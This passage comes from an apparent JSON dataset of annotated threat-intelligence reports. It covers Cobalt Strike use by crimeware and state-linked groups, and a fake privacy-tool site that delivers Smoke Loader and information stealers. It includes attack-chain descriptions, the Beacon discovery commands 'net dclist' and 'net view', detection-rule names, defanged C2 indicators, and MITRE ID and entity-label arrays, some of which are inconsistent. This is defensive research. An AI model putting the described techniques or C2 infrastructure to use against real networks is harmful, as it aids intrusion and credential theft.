tools](https://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html) used by the threat actors included Cobalt Strike Beacon.\nThis campaign was attributed to threat actors working for Russia\u2019s Foreign Intelligence Service \u2013 a group with Cobalt Strike in their toolbox\u00a0[since at least](https://www.fireeye.com/blog/threat-research/2018/11/not-so-cozy-an-uncomfortable-examination-of-a-suspected-apt29-phishing-campaign.html)\u00a02018.\nThis high-profile activity was part of a clever attack chain enabling advanced threat actors to surreptitiously compromise a relatively small number of victims.\nThe tool used, and customized to fit their needs,\u00a0is almost a decade old but increasingly popular.\nCobalt Strike\u00a0[debuted](https://blog.cobaltstrike.com/2016/03/02/a-history-of-cobalt-strike-in-training-courses/)\u00a0in 2012 in response to perceived gaps in\u00a0an existing red team tool, the Metasploit Framework.\nIn 2015, Cobalt Strike 3.0 launched as a standalone adversary emulation platform.\nBy 2016,\u00a0Proofpoint\u00a0researchers\u00a0began observing threat actors using Cobalt Strike.\nHistorically,\u00a0Cobalt Strike use in malicious operations was largely\u00a0associated with\u00a0well-resourced threat actors,\u00a0including\u00a0[large cybercrime\u00a0operators](https://community.broadcom.com/symantecenterprise/communities/community-home/librarydocuments/viewdocument?DocumentKey=257dd693-5986-41bf-bc33-f9dc76d9c6a8&CommunityKey=1ecf5f55-9545-44d6-b0f4-4e4a7f5f5e68&tab=librarydocuments)\u00a0like\u00a0TA3546\u00a0(also known as FIN7), and advanced persistent threat (APT)\u00a0[groups\u00a0such as TA423](https://www.proofpoint.com/us/threat-insight/post/leviathan-espionage-actor-spearphishes-maritime-and-defense-targets)\u00a0(also known as Leviathan\u00a0or APT40).\nProofpoint researchers have\u00a0attributed two-thirds of\u00a0identified\u00a0Cobalt Strike campaigns\u00a0from 2016 through 2018 to\u00a0well-resourced\u00a0cybercrime organizations or APT groups.\nThat ratio decreased\u00a0dramatically the following years\u00a0\u2013 between 2019 and present, just 15\u00a0percent\u00a0of Cobalt Strike campaigns\u00a0were\u00a0attributable to known threat actors.\n![Chart, line chart Description automatically generated](data:image;base64_removed,)\u00a0\n*Figure 1: Number of email messages associated with a Cobalt Strike payload observed over\u00a0time.\nNote: 2021 figures include data through May\u00a02021.*\nThreat actors\u00a0can obtain Cobalt Strike in a variety of ways:\u00a0purchasing it directly from the\u00a0vendor\u2019s\u00a0website, which requires verification;\u00a0buying\u00a0a version\u00a0on the dark web\u00a0via\u00a0various hacking forums;\u00a0or using cracked, illegitimate\u00a0versions of the software.\nIn March 2020, a cracked version\u00a0of Cobalt Strike 4.0 was released\u00a0and made available to threat actors.\n### Cobalt Strike\u2019s Appeal\nCobalt Strike is used by a diverse array of threat actors, and while it\u00a0is not unusual for cybercriminal and APT actors to leverage similar tooling in their campaigns, Cobalt Strike is unique in\u00a0that\u00a0\u00a0its\u00a0built-in capabilities\u00a0enable it to\u00a0be quickly deployed and operationalized regardless of actor sophistication or access to human or financial resources.\nThe job of simulating actor attacks and penetrating defenses might become a bit more straightforward when both sides are using the same tool.\nCobalt Strike is also\u00a0session-based \u2014 that is, if threat actors can access a host and complete an operation without needing to establish ongoing persistence, there will not be remaining artifacts on the host after it is no longer running in-memory.\nIn essence: they can hit it and forget it.\nThreat actors can also use the malleability of Cobalt Strike to create customized builds that add or remove features to achieve objectives or evade detection.\nFor example, APT29 frequently uses custom Cobalt Strike Beacon loaders to\u00a0[blend in](https://www.fireeye.com/blog/threat-research/2018/11/not-so-cozy-an-uncomfortable-examination-of-a-suspected-apt29-phishing-campaign.html)\u00a0with legitimate traffic or\u00a0[evade analysis](https://www.microsoft.com/security/blog/2021/05/28/breaking-down-nobeliums-latest-early-stage-toolset/).\nFor defenders,\u00a0customized Cobalt Strike modules often require unique signatures, so threat detection engineers may be required to play catch-up to Cobalt Strike use in the wild.\nCobalt Strike\u00a0is also\u00a0appealing to threat actors\u00a0for\u00a0its inherent obfuscation.\nAttribution gets more difficult if everyone is using the same tool.\nIf\u00a0an organization has\u00a0a red team actively making use of it, it\u00a0is possible malicious traffic could be mistaken as legitimate.\nThe\u00a0software\u2019s\u00a0ease\u00a0of use\u00a0can improve\u00a0the\u00a0capabilities\u00a0of less sophisticated actors.\nFor sophisticated actors, why spend development cycles on something\u00a0new\u00a0when you already have a great tool for the job.\nProofpoint data shows\u00a0Cobalt Strike is a\u00a0popular tool\u00a0for everything from strategic compromises to noisy, widespread campaigns.\nThe following examples illustrate a small sampling of the types of threat actors leveraging Cobalt Strike\u00a0tracked by\u00a0Proofpoint.\n### Threat Actors\n**TA800**\u00a0\nTA800 is a large\u00a0crimeware\u00a0group tracked by Proofpoint since\u00a0mid-2019.\nThis actor attempts to deliver and install banking malware or malware loaders, including\u00a0The Trick and\u00a0BazaLoader.\nIn April 2020, TA800 became the first group observed distributing\u00a0BazaLoader.\nIn these early campaigns, the\u00a0threat actor distributed emails with a malicious link to an executable or a landing page hosted on Google Docs with a link to an executable.\nThe executable downloaded the\u00a0BazaLoader\u00a0backdoor which in turn downloaded Cobalt Strike.\nIn February 2021, the group pivoted to distributing Cobalt Strike as a first-stage payload via malicious URLs.\u00a0\nThere has\u202fbeen some evidence suggesting\u202fTA800\u2019s\u00a0[NimzaLoader](https://www.proofpoint.com/us/blog/threat-insight/nimzaloader-ta800s-new-initial-access-malware)is\u202fbeing\u202fused to download and execute Cobalt Strike as its secondary payload.\n**TA547**\u00a0\nTA547 is\u00a0a\u00a0crimeware\u00a0actor tracked by Proofpoint since October 2017.\nThis group appears to be interested in distributing primarily banking trojans \u2013 including\u00a0The\u00a0Trick and\u00a0ZLoader\u00a0\u2013 to various geographic\u00a0regions.\nSince mid-2020, this actor favors using malicious Microsoft\u00a0Office\u00a0attachments to distribute\u00a0malware.\nIn February 2021, TA547\u00a0began distributing Cobalt Strike as a second-stage payload for command and control.\n**TA415**\u00a0\nTA415 is an\u00a0APT\u00a0actor\u00a0believed to be associated with\u00a0People\u2019s Republic of China\u00a0(PRC)\u00a0state interests.\nThe group has been noted in United States court filings to be tied to PRC\u2019s Ministry of State Security.\nTA415 is also known as Barium\u00a0and APT41.\nProofpoint identified TA415\u00a0delivering Cobalt Strike as a first-stage payload\u00a0in limited campaigns during mid-2020.\nIn September 2020, the United States Department of Justice announced the indictment of several threat actors associated with this threat group, and\u00a0[detailed](https://www.justice.gov/opa/pr/seven-international-cyber-defendants-including-apt41-actors-charged-connection-computer)\u00a0the threat actors use of Cobalt Strike in\u00a0the\u00a0indictment.\nBased on recent\u00a0[reporting by Group-IB](https://blog.group-ib.com/colunmtk_apt41),\u00a0\nTA415\u00a0used\u00a0Cobalt Strike in a campaign against an entity in the airlines sector.\nThe following timeline provides\u00a0a small sample of\u00a0threat actor use of Cobalt Strike across cybercrime and APT threats.\nThe\u00a0selected\u00a0events\u00a0were identified based on their significance, and\u00a0are not representative of the full Cobalt Strike threat landscape.\n![Timeline Description automatically generated](data:image;base64_removed,)\u00a0\n*Figure 2: Timeline of threats using Cobalt Strike.\nLinks to the sources are available in the References section.*\n### Attack Chain\nProofpoint has observed dozens of threat actors using Cobalt Strike.\nHowever,\u00a0like their legitimate counterparts, threat actors exhibit many attack paths and use cases of the\u00a0malicious actor\u00a0emulation software.\nThreat actors use different lure themes, threat types, droppers, and payloads.\nFor example, the earliest Cobalt Strike campaigns distributed email threats with malicious document attachments to distribute the malware, but campaigns distributing malicious URLs directly in the email body have overtaken attachments as the more frequently utilized threat type.\nWhile instances of Cobalt Strike being sent directly as an initial payload have dramatically increased, deployment as a second stage payload remains popular.\nCobalt Strike has been observed in a variety of attack chains alongside malware such as The Trick,\u00a0BazaLoader,\u00a0Ursnif,\u00a0IcedID, and many more popular loaders.\nIn these cases, the preceding malware typically loads and executes Cobalt Strike.\nLikewise, there is a wide array of techniques leveraged in cases where Cobalt Strike is delivered directly, such as via malicious macros in weaponized Office documents, compressed executables, PowerShell, dynamic data exchange (DDE), HTA/HTML files, and traffic distribution systems.\nAfter Cobalt Strike has been executed and a\u00a0Beacon established\u00a0for C2 communication, actors have been observed attempting to enumerate network connections and dumping Active Directory credentials as they try to move laterally to a network resource such as a Domain Controller, allowing for deployment of ransomware to all networked systems.\nFor example, the Cobalt Strike\u00a0[documentation states](https://www.cobaltstrike.com/help-beacon):\u00a0\u00a0\nUse the net\u00a0dclist\u00a0command to find the\u00a0Domain\u00a0Controller for the domain the target is joined to.\nUse the\u00a0net view\u00a0command to find targets on the domain the target is joined to.\nIn addition to network discovery and credential dumping, Cobalt Strike Beacon also has the capability to elevate privileges, load and execute additional tools, and to inject these functions into existing running host processes to attempt to avoid detection.\n### Outlook\nProofpoint researchers anticipate Cobalt Strike will continue to be a commonly used tool in threat actor toolsets.\nAccording to internal data,\u00a0tens of thousands of\u00a0organizations\u00a0have already been targeted\u00a0with\u00a0Cobalt Strike, based on observed campaigns.\nWe expect this number to increase in 2021.\n![Chart type: Line. TOTAL_CUST increases over time. Description automatically generated](data:image;base64_removed,)\u00a0\n*Figure 3: Number of customers targeted by threats using Cobalt Strike*\n### Conclusion\nCobalt Strike is a useful tool, for legitimate security researchers and threat actors alike.\nIts malleability coupled with\u00a0its usability makes it a robust and effective tool for siphoning data, moving laterally, and\u00a0loading additional malware payloads.\nCobalt Strike is not the only red team tool appearing more often in\u00a0Proofpoint\u00a0data.\nOthers include Mythic, Meterpreter, and the Veil Framework.\nThe use of publicly available tooling aligns with a broader trend observed by Proofpoint:\nThreat actors are using as many legitimate tools as possible, including executing Windows processes like PowerShell and WMI; injecting malicious code into legitimate binaries; and frequently using allowable services like Dropbox, Google Drive, SendGrid, and Constant Contact to host and distribute malware.\n#### References\nThe following references are associated with the above timeline.\nJanuary 2016 \u2013\u00a0[Odinaff: New Trojan used in high level financial attacks]\n(https://community.broadcom.com/symantecenterprise/communities/community-home/librarydocuments/viewdocument?DocumentKey=257dd693-5986-41bf-bc33-f9dc76d9c6a8&CommunityKey=1ecf5f55-9545-44d6-b0f4-4e4a7f5f5e68&tab=librarydocuments)\u00a0\nMay 2017 \u2013\u00a0[Microsoft Word Intruder Integrates CVE-2017-0199, Utilized by Cobalt Group to Target Financial Institutions]\n(https://www.proofpoint.com/us/threat-insight/post/microsoft-word-intruder-integrates-cve-2017-0199-utilized-cobalt-group-target)\u00a0\nOctober 2017 \u2013\u00a0[Leviathan: Espionage actor\u00a0spearphishes\u00a0maritime and defense targets]\n(https://www.proofpoint.com/us/threat-insight/post/leviathan-espionage-actor-spearphishes-maritime-and-defense-targets)\u00a0\nApril 2018 \u2013\u00a0[APT\u653b\u6483\u8005\u30b0\u30eb\u30fc\u30d7\u00a0menuPass(APT10)\u00a0\u306b\u3088\u308b\u65b0\u305f\u306a\u653b\u6483\u3092\u78ba\u8a8d]\n(https://www.lac.co.jp/lacwatch/people/20180521_001638.html)\u00a0\nNovember 2018 \u2013\u00a0[Not So Cozy: An Uncomfortable Examination of a Suspected APT29 Phishing Campaign]\n(https://www.fireeye.com/blog/threat-research/2018/11/not-so-cozy-an-uncomfortable-examination-of-a-suspected-apt29-phishing-campaign.html)\u00a0\n\u00a02019 \u2013\u00a0[Seven International Cyber Defendants, Including \u201cApt41\u201d Actors, Charged In Connection With Computer Intrusion Campaigns Against More Than 100 Victims Globally]\n(https://www.justice.gov/opa/pr/seven-international-cyber-defendants-including-apt41-actors-charged-connection-computer)\u00a0\u00a0\nNovember 2019 \u2013\u00a0[TA2101 plays government imposter to distribute malware to German, Italian, and US organizations]\n(https://www.proofpoint.com/us/threat-insight/post/ta2101-plays-government-imposter-distribute-malware-german-italian-and-us)\u00a0\nSeptember 2020 \u2013\u00a0[Chinese Ministry of State Security-Affiliated Cyber Threat Actor Activity]\n(https://us-cert.cisa.gov/ncas/alerts/aa20-258a)\u00a0\nDecember 2020 \u2013\u00a0[Highly Evasive Attacker Leverages SolarWinds Supply Chain to Compromise Multiple Global Victims With SUNBURST Backdoor]\n(https://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html)\u00a0\nMarch 2021 \u2013\u00a0[NimzaLoader: TA800\u2019s New Initial Access Malware]\n(https://www.proofpoint.com/uk/blog/threat-insight/nimzaloader-ta800s-new-initial-access-malware)\u00a0\nMay 2021 \u2013\u00a0[New sophisticated email-based attack from NOBELIUM]\n(https://www.microsoft.com/security/blog/2021/05/27/new-sophisticated-email-based-attack-from-nobelium/)\u00a0\n#### Detections\nProofpoint Emerging Threats includes robust detections for Cobalt Strike.\nThe following are a sample of our detections as they relate to the behaviors described in this report.\n2028591 ET TROJAN\u00a0Cobalt Strike Malleable C2 Request YouTube Profile\u00a0\n2028589 ET TROJAN\u00a0Cobalt Strike Malleable C2 Response O365 Profile M2\u00a0\n2032749 ET TROJAN\u00a0Cobalt\u00a0Strike Malleable C2 Amazon Profile\u00a0\n2032746 ET TROJAN\u00a0Cobalt\u00a0Strike Malleable C2\u00a0QiHoo\u00a0Profile\u00a0\n2027082 ET TROJAN Observed Malicious SSL Cert\u00a0CobaltStrike\u00a0C2\u00a0\n2023629 ET INFO Suspicious Empty SSL Certificate - Observed in Cobalt Strike\u00a0\n2032362 ET TROJAN Cobalt Strike Beacon Activity\u00a0\n2032951 ET TROJAN Observed Cobalt Strike User-Agent\u00a0", "mitre_ids": ["S0154", "S0154", "S0154", "S0154", "S0154", "S0154", "TA0001", "TA0002", "TA0003", "S0154", "TA0001", "S0154", "S0154", "S0154", "S0154", "S0154", "S0154", "S0154", "S0154", "G0046", "G0046", "G0065", "G0065", "G0065", "S0154", "S0154", "T1566", "S0154", "S0154", "S0154", "S0154", "S0154", "S0154", "T1620", "S0154", "G0016", "S0154", "S0154", "S0154", "S0154", "S0154", "T1027", "TA0011", "S0154", "S0154", "S0266", "S0534", "S0534", "T1566", "T1566", "S0534", "S0154", "T1105", "S0154", "T1566", "S0154", "S0266", "T1566", "S0154", "T1105", "TA0011", "G0096", "G0096", "G0096", "G0096", "G0096", "G0096", "S0154", "S0154", "G0096", "S0154", "S0154", "S0154", "S0154", "S0154", "T1566", "S0154", "T1566", "T1566", "S0154", "S0154", "S0266", "S0534", "S0386", "S0483", "S0154", "TA0011", "S0154", "T1566", "T1059", "T1559", "T1059", "T1059", "S0154", "S0154", "TA0011", "T1046", "T1486", "TA0006", "S0154", "T1486", "T1482", "T1486", "T1482", "T1046", "TA0006", "S0154", "S0154", "TA0004", "T1105", "T1055", "S0154", "S0154", "S0154", "S0154", "T1105", "S0154", "T1059", "T1055", "T1566", "G0045", "G0016", "T1566", "T1195", "TA0001", "T1566", "S0154", "S0154", "TA0011", "S0154", "TA0011", "TA0011", "TA0011", "S0154", "TA0011", "S0154", "S0154", "S0154", "S0154"], "anno_name_label": [["GROUP", "TA800"], ["GROUP", "TA800"], ["GROUP", "TA800"], ["GROUP", "TA800"], ["GROUP", "TA547"], ["GROUP", "TA547"], ["MALWARE", "Zloader"], ["GROUP", "TA547"], ["TOOL", "Meterpreter"], ["TOOL", "VeilFramework"], ["GROUP", "TA800"]], "cti_entity_class": ["CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CI", "CE", "CE", "CE", "CE", "CI", "CI", "CE", "CE", "CE", "CE", "CE", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE"]}, {"cti_report": "Malware Masquerades as Privacy Tool\nJuly 01, 2021\nKey Findings\n------------\n* Threat actors created a detailed, legitimate looking \u201cPrivacy Tools\u201d website to trick victims into downloading malware.\n* The Privacy Tools site purports to offer file protection via encryption and decryption services but leads to the installation of multiple malware families.\n* Smoke Loader is downloaded first as the malicious executable which drops follow-on malware including Racoon Stealer and RedLine malware.\nOverview\n--------\nProofpoint researchers found a new threat enticing users to download malware by masquerading as a \u201cPrivacy Tools\u201d service offering a tool that \u201cencrypts\u201d user data using a zip-like utility.\nThe fake website is professional-looking and contains detailed descriptions of the alleged service including step-by-step instructions on how to download the privacy tools \u2013 which turn out to be malware.\nProofpoint researchers identified the initial payload as Smoke Loader, a popular downloader available on easily accessible forums for buying and selling malware and used by multiple threat actors.\nThe malware subsequently installs follow-on data-stealing malware including Raccoon Stealer and RedLine.\nWhile investigating the observed campaign, Proofpoint identified [additional](https://twitter.com/pmmkowalczyk/status/1369647346997469186) related [samples](https://twitter.com/jorgemieres/status/1382400601158455297) publicly shared by other researchers since March 2021.\nThe privacy theme is ironic considering the ultimate payload is designed to exfiltrate information from an infected host.\nHowever, it may appeal to users who are concerned about data sharing and privacy \u2013 a number that is likely increasing due to the recent mainstream marketing of user-focused [privacy controls](https://www.npr.org/2021/04/26/990943261/apple-rolls-out-major-new-privacy-protections-for-iphones-and-ipads) from major companies like Apple.\nCampaign Details\n----------------\nThe threat actors created a website offering privacy tools for business and personal use.\n![1malwareasprivacy](/sites/default/files/inline-images/Picture1_8.png)\n*Figure 1: Screenshot of \u201cPrivacy Tools\u201d website.*\nVisitors are instructed to download and install Privacy Tools software via a specific section of the website.\n![MalwareasPrivacy](/sites/default/files/inline-images/PIC2.png)\n*Figure 2: Screenshot of the Privacy Tools download instructions.*\nThe compressed executables available for download purport to be file protection resources.\nThe website actually downloads Smoke Loader, a modular downloader with multiple capabilities.\nSmoke Loader first appeared in 2011 and is available for purchase on criminal forums.\nIt is commonly used by threat actors that target both individual and corporate users.\nProofpoint researchers observed that the Smoke Loader infection subsequently downloads follow-on malware to conduct information-gathering activities.\nIdentified second-stage payloads include RedLine and Raccoon Stealer malware.\nAdditional [security researchers](https://twitter.com/pmmkowalczyk/status/1369647346997469186) noticed this activity in 2021 along with Proofpoint observations.\nRaccoon Stealer is an increasingly popular malware that first appeared in 2019.\nIt was [advertised as](https://blog.cyberint.com/raccoon-stealer) a \u201cmalware as a service\u201d on cybercriminal forums.\nIt can steal credentials such as passwords, website cookies, credit card data, system information, and bitcoin wallet contents.\nRedLine Stealer is a malware that aims to steal information from browsers such as login, autocomplete, passwords, and credit cards.\nIt also collects information about the user and their system, such as the username, location, hardware configuration, and installed security software.\nAn [update](https://bartblaze.blogspot.com/2021/06/digital-artists-targeted-in-redline.html) to [RedLine](https://www.proofpoint.com/uk/threat-insight/post/new-redline-stealer-distributed-using-coronavirus-themed-email-campaign) Stealer in early 2021 also added the ability to steal cryptocurrency cold wallets.\nProofpoint does not attribute the activity to a specific group.\nOne IP address identified in this campaign is associated with OpenNIC, a public service used for resolving certain types of domains that provides alternatives to domains not administered by ICANN.\nThe privacy-themed websites delivering Smoke Loader in this campaign were registered by ssserviceshop1@yandex[.]ru via Registrar of Domain Names REG[.]ru, LLC.\nMultiple other privacy-themed domains and C2 IPs were also registered with the same email address and registrar.\n***Analyst Note:***[*Previous research*](https://www.ptsecurity.com/ww-en/analytics/pt-esc-threat-intelligence/operation-ta505-part3/) *published in May 2020 attributed a Smoke Loader-related domain registered with the same email and URL naming conventions as observed in this campaign to TA505.\nProofpoint cannot confirm the veracity of that reporting.\nThere is no available evidence to attribute the observed activity in the privacy-themed campaigns to TA505.*\nConclusion\n----------\nThe use of a privacy-themed lure to download information-stealing malware is an ironic yet predatory mechanism for enticing users to download malware.\nThe lure is likely effective as the threat actors behind the campaign appear to have taken considerable time and effort to design a legitimate-looking privacy tool.\nBased on additional indicators uncovered, it is likely this threat actor is conducting \u2013 and has previously conducted \u2013 similar campaigns using privacy themes and convincing lures to distribute Smoke Loader and follow-on malware.\nProofpoint anticipates this type of theme and activity to continue, especially for consumers who do not have corporate privacy and security services already installed on their hosts.\nIndicators of Compromise (IOCs)\u00a0\nObserved in Identified Smoke Loader Campaign\n| **IOC** | **IOC Type** | **Description** |\n| privacytools[.]xyz | Domain | Website hosting fake privacy tool download |\n| privacytoolsforyou[.]site | Domain | Website hosting fake privacy tool download |\n| privacmytools[.]site | Domain | Website hosting fake privacy tool download |\n| http://999080321newfolder1002002131-service1002[.]space/ | URL | C2 |\n| http://999080321newfolder1002002231-service1002[.]space/ | URL | C2 |\n| http://999080321newfolder3100231-service1002[.]space/ | URL | C2 |\n| http://999080321newfolder1002002431-service1002[.]space/ | URL | C2 |\n| http://999080321newfolder1002002531-service1002[.]space/ | URL | C2 |\n| http://999080321newfolder33417-012425999080321[.]space/ | URL | C2 |\n| http://999080321test125831-service10020125999080321[.]space/ | URL | C2 |\n| http://999080321test136831-service10020125999080321[.]space/ | URL | C2 |\n| http://999080321test147831-service10020125999080321[.]space/ | URL | C2 |\n| http://999080321test146831-service10020125999080321[.]space/ | URL | C2 |\n| http://999080321test134831-service10020125999080321[.]space/ | URL | C2 |\n| http://999080321est213531-service1002012425999080321[.]ru/ | URL | C2 |\n| http://999080321yes1t3481-service10020125999080321[.]ru/ | URL | C2 |\n| http://999080321test13561-service10020125999080321[.]su/ | URL | C2 |\n| http://999080321test14781-service10020125999080321[.]info/ | URL | C2 |\n| http://999080321test13461-service10020125999080321[.]net/ | URL | C2 |\n| http://999080321test15671-service10020125999080321[.]tech/ | URL | C2 |\n| http://999080321test12671-service10020125999080321[.]online/ | URL | C2 |\n| http://999080321utest1341-service10020125999080321[.]ru/ | URL | C2 |\n| http://999080321uest71-service100201dom25999080321[.]ru/ | URL | C2 |\n| http://999080321test61-service10020125999080321[.]website/ | URL | C2 |\n| http://999080321test51-service10020125999080321[.]xyz/ | URL | C2 |\n| http://999080321test41-service100201pro25999080321[.]ru/ | URL | C2 |\n| http://999080321yest31-service100201rus25999080321[.]ru/ | URL | C2 |\n| http://999080321rest21-service10020125999080321[.]eu/ | URL | C2 |\n| http://999080321test11-service10020125999080321[.]press/ | URL | C2 |\n| http://999080321newfolder4561-service10020125999080321[.]ru/ | URL | C2 |\n| http://999080321rustest213-service10020125999080321[.]ru/ | URL | C2 |\n| http://999080321test281-service10020125999080321[.]ru/ | URL | C2 |\n| http://999080321test261-service10020125999080321[.]space/ | URL | C2 |\n| http://999080321yomtest251-service10020125999080321[.]ru/ | URL | C2 |\n| http://999080321yirtest231-service10020125999080321[.]ru/ | URL | C2 |\n| http://999080321test391-service10020125999080321[.]ru/ | URL | C2 |\n| http://999080321test481-service10020125999080321[.]ru/ | URL | C2 |\n| http://999080321test571-service10020125999080321[.]pro/ | URL | C2 |\n| http://999080321test461-service10020125999080321[.]host/ | URL | C2 |\n| http://999080321test231-service10020125999080321[.]fun/ | URL | C2 |\n| http://999080321tostest371-service10020125999080321[.]ru/ | URL | C2 |\n| http://999080321oopoest361-service10020125999080321[.]ru/ | URL | C2 |\n| http://999080321newfolder481-service10020125999080321[.]ru/ | URL | C2 |\n| http://999080321newfolder471-service10020125999080321[.]ru/ | URL | C2 |\n| http://999080321newfolder351-service10020125999080321[.]ru/ | URL | C2 |\n| http://999080321newfolder241-service10020125999080321[.]ru/ | URL | C2 |\n| http://999080321newfolder1002-service100201shop25999080321[.]ru/ | URL | C2 |\n| http://999080321newfolder1002-service100201life25999080321[.]ru/ | URL | C2 |\n| http://999080321newfolder1002-service100201blog25999080321[.]ru/ | URL | C2 |\n| http://999080321megatest251-service10020125999080321[.]ru/ | URL | C2 |\n| http://999080321infotest341-service10020125999080321[.]ru/ | URL | C2 |\n| http://999080321besttest971-service10020125999080321[.]ru/ | URL | C2 |\n| http://999080321shoptest871-service10020125999080321[.]ru/ | URL | C2 |\n| http://999080321kupitest451-service10020125999080321[.]ru/ | URL | C2 |\n| http://999080321proftest981-service10020125999080321[.]ru/ | URL | C2 |\n| http://999080321clubtest561-service10020125999080321[.]ru/ | URL | C2 |\n| http://999080321mytest151-service1002012425999080321[.]ru/ | URL | C2 |\n| http://999080321newfoldert161-service1002012425999080321[.]ru/ | URL | C2 |\n| http://999080321newfolder100251-service25999080321[.]ru/ | URL | C2 |\n| http://999080321newfolder100241-service10020999080321[.]ru/ | URL | C2 |\n| http://999080321newfolder100231-service1022020[.]ru/ | URL | C2 |\n| http://999080321newfolder100221-service1022020[.]ru/ | URL | C2 |\n| http://999080321newfolder1002-012525999080321[.]ml/ | URL | C2 |\n| http://999080321newfolder1002-012625999080321[.]ga/ | URL | C2 |\n| http://999080321newfolder1002-012725999080321[.]cf/ | URL | C2 |\n| http://999080321newfolder1002-012825999080321[.]gq/ | URL | C2 |\n| http://999080321newfolder1002-012925999080321[.]com/ | URL | C2 |\n| http://999080321newfolder1002-01302599908032135[.]site/ | URL | C2 |\n| http://999080321newfolder1002-01312599908032135[.]site/ | URL | C2 |\n| http://999080321newfolder1002-01322599908032135[.]site/ | URL | C2 |\n| http://999080321newfolder1002-01332599908032135[.]site/ | URL | C2 |\n| http://999080321newfolder1002-01342599908032135[.]site/ | URL | C2 |\n| http://999080321newfolder1002-01352599908032135[.]site/ | URL | C2 |\n| http://999080321newfolder1002-01362599908032135[.]site/ | URL | C2 |\n| http://999080321newfolder1002-01372599908032135[.]site/ | URL | C2 |\n| http://999080321newfolder1002-01382599908032135[.]site/ | URL | C2 |\n| http://999080321newfolder1002-01392599908032135[.]site/ | URL | C2 |\n| http://999080321newfolder1002-01402599908032135[.]site/ | URL | C2 |\n| http://999080321newfolder1002-01412599908032135[.]site/ | URL | C2 |\n| http://999080321newfolder1002-01422599908032135[.]site/ | URL | C2 |\n| http://999080321newfolder1002-01432599908032135[.]site/ | URL | C2 |\n| http://999080321newfolder1002-01442599908032135[.]site/ | URL | C2 |\n| http://999080321newfolder1002-01452599908032135[.]site/ | URL | C2 |\n| http://999080321newfolder1002-01462599908032135[.]site/ | URL | C2 |\n| http://999080321newfolder1002-01472599908032135[.]site/ | URL | C2 |\n| http://999080321newfolder1002-01482599908032135[.]site/ | URL | C2 |\n| http://999080321newfolder1002-01492599908032135[.]site/ | URL | C2 |\n| http://999080321newfolder1002-01502599908032135[.]site/ | URL | C2 |\n| http://999080321newfolder1002-01512599908032135[.]site/ | URL | C2 |\n| http://999080321newfolder1002-01522599908032135[.]site/ | URL | C2 |\n| http://999080321newfolder1002-01532599908032135[.]site/ | URL | C2 |\n| http://999080321newfolder1002-01542599908032135[.]site/ | URL | C2 |\n| http://999080321newfolder1002-01552599908032135[.]site/ | URL | C2 |\n| 192[.]71[.]245[.]208 | IP | DNS |\n| 91[.]217[.]137[.]37 | IP | DNS |\n| 172[.]104[.]136[.]243 | IP | DNS |\n| 176[.]126[.]70[.]119 | IP | DNS |\n| 94[.]103[.]153[.]176 | IP | DNS |\n| 161[.]97[.]219[.]84 | IP | DNS |\n| 207[.]192[.]71[.]13 | IP | DNS |\n| 188[.]226[.]146[.]136 | IP | DNS |\n| 178[.]63[.]116[.]152 | IP | DNS |\n| 13[.]239[.]157[.]177 | IP | DNS |\n| 0xa8e21be | SendRC4Key | RSA Encryption Key |\n| 0x8fc93161 | RecvRC4Key | RSA Encryption Key |", "mitre_ids": ["T1036", "T1566", "S0226", "T1105", "S0226", "TA0010", "T1204", "S0226", "S0226", "S0226", "TA0006", "T1082", "T1539", "T1555", "T1518", "S0226", "TA0011", "S0226", "G0092", "G0092", "S0226", "S0226", "TA0011", "TA0011", "TA0011", "TA0011", "TA0011", "TA0011", "TA0011", "TA0011", "TA0011", "TA0011", "TA0011", "TA0011", "TA0011", "TA0011", "TA0011", "TA0011", "TA0011", "TA0011", "TA0011", "TA0011", "TA0011", "TA0011", "TA0011", "TA0011", "TA0011", "TA0011", "TA0011", "TA0011", "TA0011", "TA0011", "TA0011", "TA0011", "TA0011", "TA0011", "TA0011", "TA0011", "TA0011", "TA0011", "TA0011", "TA0011", "TA0011", "TA0011", "TA0011", "TA0011", "TA0011", "TA0011", "TA0011", "TA0011", "TA0011", "TA0011", "TA0011", "TA0011", "TA0011", "TA0011", "TA0011", "TA0011", "TA0011", "TA0011", "TA0011", "TA0011", "TA0011", "TA0011", "TA0011", "TA0011", "TA0011", "TA0011", "TA0011", "TA0011", "TA0011", "TA0011", "TA0011", "TA0011", "TA0011", "TA0011", "TA0011", "TA0011", "TA0011", "TA0011", "TA0011", "TA0011", "TA0011", "TA0011", "TA0011", "TA0011", "TA0011", "TA0011", "TA0011", "TA0011", "TA0011", "TA0011"], "anno_name_label": [["MALWARE", "Raccoon stealer"], ["MALWARE", "Redline stealer"], ["TECHNIQUE", "Redline stealer"], ["MALWARE", "Raccoon stealer"], ["MALWARE", "Redline stealer"], ["MALWARE", "Redline stealer"], ["MALWARE", "Raccoon stealer"], ["MALWARE", "Raccoon stealer"], ["MALWARE", "Redline stealer"], ["MALWARE", "Redline stealer"]], "cti_entity_class": ["CE", "CI", "CE", "CE", "CE", "CI", "CI", "CE", "CE", "CE", "CE", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CI", "CE", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", 